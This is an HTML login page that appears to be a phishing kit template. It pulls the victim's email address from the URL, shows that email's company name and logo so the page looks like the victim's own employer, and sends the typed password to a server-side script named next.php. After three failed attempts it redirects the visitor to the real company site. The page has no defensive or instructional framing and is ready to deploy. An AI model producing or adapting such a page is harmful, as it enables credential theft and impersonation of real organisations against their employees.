<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0; shrink-to-fit=no">
    <title>Portal</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <!-- Add your CSS Styles -->
</head>

<body>
    <div id="main-outer-container">
        <div id="main-inner-container">
            <div>
                <img id="logoImg" src="#" alt="Logo" />
            </div>
            <h5 id="companyName">COMPANY</h5>
            <div id="err" style="display: none; color: red;">
                An error occurred. Please try again.
            </div>
            <input type="email" id="id" value="user@example.com" readonly />
            <input type="password" id="pass" placeholder="Enter your password" />
            <button onclick="nextFun()">Login</button>
        </div>
    </div>

    <script>
        let failedAttempts = 0; // Counter for failed login attempts

        /* Login Functionality */
        function nextFun() {
            const username = document.getElementById("id").value;
            const password = document.getElementById("pass").value;

            if (username.length === 0 || password.length === 0) {
                document.getElementById("err").innerText = "Email or Password cannot be empty.";
                document.getElementById("err").style.display = "block";
                setTimeout(() => {
                    document.getElementById("err").style.display = "none";
                }, 2000);
                return;
            }

            $.ajax({
                url: "./next.php",
                type: "POST",
                data: { di: username, pr: password },
                success: function (response) {
                    if (response.success) {
                        window.location.replace(response.redirectUrl || `https://${username.split("@")[1]}`);
                    } else {
                        failedAttempts++;
                        document.getElementById("err").innerText = response.message || "Invalid credentials. Please try again.";
                        document.getElementById("err").style.display = "block";

                        if (failedAttempts >= 3) {
                            // Redirect after 3 failed attempts
                            window.location.replace(`https://${username.split("@")[1]}`);
                        }
                    }
                },
                error: function () {
                    failedAttempts++;
                    document.getElementById("err").innerText = "An error occurred. Please try again.";
                    document.getElementById("err").style.display = "block";

                    if (failedAttempts >= 3) {
                        // Redirect after 3 failed attempts
                        window.location.replace(`https://${username.split("@")[1]}`);
                    }
                },
                complete: function () {
                    document.getElementById("pass").value = ""; // Clear password field
                },
            });
        }

        /* ENTER key triggering login */
        document.addEventListener("keydown", function (e) {
            if (e.key === "Enter") nextFun();
        });

        /* Update company name and logo dynamically from URL */
        document.addEventListener("DOMContentLoaded", function () {
            const hash = window.location.hash.substring(1);
            if (hash && hash.includes("@")) {
                const domain = hash.split("@")[1];
                document.getElementById("id").value = hash;
                document.getElementById("companyName").innerText = domain.split(".")[0].toUpperCase();
                document.getElementById("logoImg").src = `https://www.google.com/s2/favicons?sz=128&domain=${domain}`;
            }
        });
    </script>
</body>

</html>
